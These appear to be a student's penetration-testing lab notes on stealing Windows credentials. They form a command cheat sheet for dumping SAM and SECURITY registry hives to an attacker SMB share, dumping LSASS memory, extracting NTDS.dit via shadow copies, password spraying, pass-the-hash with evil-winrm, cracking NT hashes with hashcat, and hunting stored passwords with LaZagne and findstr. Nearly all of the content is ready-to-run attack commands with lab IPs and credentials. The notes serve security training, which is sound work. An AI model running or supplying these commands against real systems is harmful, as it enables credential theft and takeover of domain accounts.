## Attacking SAM
|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
```bash
# If I'm an admin I can copy the Refistry hives 
reg.exe save hklm\sam C:\sam.save

# Creating a Share with smbserver.py
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

# moving hive copies to share
move sam.save \\10.10.15.16\CompData

# dumb hashed
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Running Hashcat against NT Hashes
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# Dumping LSA Secrets Remotely
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

# Dumping SAM Remotely
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

```

## Attacking LSASS
```bash
# dump files created with task manger loction
C:\Users\loggedonusersdirectory\AppData\Local\Temp

# Finding LSASS PID in cmd for `lsass.exe`
tasklist /svc

# Finding LSASS PID in PowerShell
Get-Process lsass

# Creating lsass.dmp using PowerShell(most modern AV tools recognize this as malicious and prevent the command from executing)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp 
# if the above command won't work use this
procdump -accepteula -ma 640 lsass.dmp
# also can use the taskManger > Detils > lsass.exe and create dump file

# pypykatz to parse the secrets hidden in the LSASS process memory dump
pypykatz lsa minidump /home/peter/Documents/lsass.dmp

# Cracking the NT Hash with Hashcat
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Attacking Active Directory & NTDS.dit
#### Username Convention In Orginitztions
|Username Convention|Practical Example for Jane Jill Doe|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|
Often, an email address's structure will give us the employee's username (structure: username@domain)

```bash
# Creating a Custom list of Usernames
./username-anarchy -i /home/ltnbob/names.txt 

# Launching the Attack with CrackMapExec
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

# location of NTDS.dit 
%systemroot$/ntds

# Manuele Method
----------------------------------------------------------------------------------------
# Connecting to a DC with Evil-WinRM
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'

# Checking Local Group Membership
net localgroup

# Checking User Account Privileges including Domain
net user bwilliamson

# Creating Shadow Copy of C:
vssadmin CREATE SHADOW /For=C:

# Copying NTDS.dit from the VSS
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
----------------------------------------------------------------------------------------

# A Faster Method: Using cme to Capture NTDS.dit
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

# Pass-the-Hash with Evil-WinRM Example
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

## Credential Hunting in Windows
### Key Terms That Can Help Us Discover Some Credentials
|   |   |   |
|---|---|---|
|Passwords|Passphrases|Keys|
|Username|User account|Creds|
|Users|Passkeys|Passphrases|
|configuration|dbcredential|dbpassword|
|pwd|Login|Credentials|

```bash
# Running Lazagne All and creates a .txt file with the output
start lazagne.exe all -oN

# Using findstr
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml


```
places to keep in mind when credential hunting:
- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)
